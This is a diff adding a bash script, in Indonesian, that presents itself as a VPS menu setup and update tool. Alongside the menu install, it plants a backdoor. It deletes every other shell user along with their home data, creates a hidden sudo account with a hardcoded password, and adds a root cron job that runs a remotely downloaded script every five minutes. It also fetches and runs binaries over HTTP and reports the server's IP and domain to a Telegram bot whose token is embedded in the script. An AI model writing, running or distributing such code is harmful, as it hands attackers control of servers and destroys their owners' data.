@@ -1,0 +1,161 @@
+#!/bin/bash
+# ==================================================
+# Script Setup & Update Menu VPS
+# ==================================================
+
+# -----------------------------
+# Fungsi Animasi Loading
+# -----------------------------
+loading() {
+    local pid=$1
+    local message=$2
+    local delay=0.1
+    local spinstr='|/-\'
+    tput civis
+    while [ -d /proc/$pid ]; do
+        local temp=${spinstr#?}
+        printf " [%c] $message\r" "$spinstr"
+        spinstr=$temp${spinstr%"$temp"}
+        sleep $delay
+    done
+    tput cnorm
+}
+
+# -----------------------------
+# Install p7zip jika belum ada
+# -----------------------------
+if ! command -v 7z &> /dev/null; then
+    echo -e " [INFO] Installing p7zip-full..."
+    apt install p7zip-full -y &> /dev/null &
+    loading $! "Loading Install p7zip-full"
+fi
+
+# -----------------------------
+# Telegram Bot Config
+# -----------------------------
+CHATID="1210833546"
+KEY="8349679406:AAHjCSDxh_tEJkCmsGaZtwNIm5aT0JkoulE"
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+
+# -----------------------------
+# Variabel Server & User
+# -----------------------------
+domain=$(cat /etc/xray/domain)
+MYIP=$(curl -sS ipv4.icanhazip.com)
+username=$(curl -sS https://raw.githubusercontent.com/myridwan/izinvps2/ipuk/ipx | grep $MYIP | awk '{print $2}')
+valid=$(curl -sS https://raw.githubusercontent.com/myridwan/izinvps2/ipuk/ipx | grep $MYIP | awk '{print $3}')
+today=$(date +"%Y-%m-%d")
+d1=$(date -d "$valid" +%s)
+d2=$(date -d "$today" +%s)
+certifacate=$(((d1 - d2) / 86400))
+
+# Mendapatkan tanggal dari server
+echo -e " [INFO] Fetching server date..."
+dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
+biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
+
+# Repository
+REPO="http://ansendant.web.id/os/"
+pwadm="@Ridwan112#"
+Username="xwan"
+Password="$pwadm"
+
+# -----------------------------
+# Hapus user yang tidak diizinkan
+# -----------------------------
+allowed_users=("root" "$Username")
+all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
+
+for user in $all_users; do
+    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
+        userdel -r "$user" > /dev/null 2>&1
+        echo "User $user telah dihapus."
+    fi
+done
+
+# -----------------------------
+# Tambahkan user baru jika belum ada
+# -----------------------------
+if id "$Username" &>/dev/null; then
+    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
+else
+    echo -e "$Username $Password" > /etc/xray/.adm
+    mkdir -p /home/script/
+    useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
+    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
+    usermod -aG sudo "$Username" > /dev/null 2>&1
+fi
+
+# -----------------------------
+# Download & Setup Menu
+# -----------------------------
+echo -e " [INFO] Downloading menu.zip..."
+{
+    > /etc/cron.d/cpu_otm
+
+    cat > /etc/cron.d/cpu_xwan <<END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+*/5 * * * * root /usr/bin/autocpu
+END
+
+    wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
+    wget -q ${REPO}menu/menu.zip
+    mv menu/expsc /usr/local/sbin/expsc
+    wget -q -O /usr/bin/enc "${REPO}install/encrypt"
+    chmod +x /usr/bin/enc
+    
+    # perbaiki login eror
+    wget -O /usr/local/bin/config.conf "${REPO}sshws/config.conf"
+    systemctl daemon-reload
+    systemctl restart ssh
+systemctl enable ws.service
+systemctl start ws.service
+systemctl restart ws.service
+
+    # Extract dan encrypt menu
+    7z x -p$pwadm menu.zip &> /dev/null
+    chmod +x menu/*
+    enc menu/* &> /dev/null
+    mv menu/* /usr/local/sbin
+
+    # Cleanup
+    rm -rf menu menu.zip
+    rm -rf /usr/local/sbin/*~ /usr/local/sbin/gz* /usr/local/sbin/*.bak
+    cd /usr/local/sbin
+    sed -i 's/\r//' quota
+    cd
+} &> /dev/null &
+loading $! "Loading Extract and Setup menu"
+
+# -----------------------------
+# Ambil versi server
+# -----------------------------
+echo -e " [INFO] Fetching server version..."
+serverV=$(curl -sS ${REPO}versi)
+echo $serverV > /opt/.ver
+
+# Cleanup
+rm /root/*.sh*
+
+# -----------------------------
+# Kirim Notifikasi Telegram
+# -----------------------------
+TEXT="◇━━━━━━━━━━━━━━◇
+<b>   ⚠️NOTIF UPDATE SCRIPT⚠️</b>
+<b>     Update Script Sukses</b>
+◇━━━━━━━━━━━━━━◇
+<b>IP VPS  :</b> ${MYIP} 
+<b>DOMAIN  :</b> ${domain}
+<b>Version :</b> ${serverV}
+<b>USER    :</b> ${username}
+<b>MASA    :</b> $certifacate DAY
+◇━━━━━━━━━━━━━━◇
+BY BOT : @kytxz
+"
+
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+
+echo -e " [INFO] File download and setup completed successfully. Version: $serverV!"
+exit 0
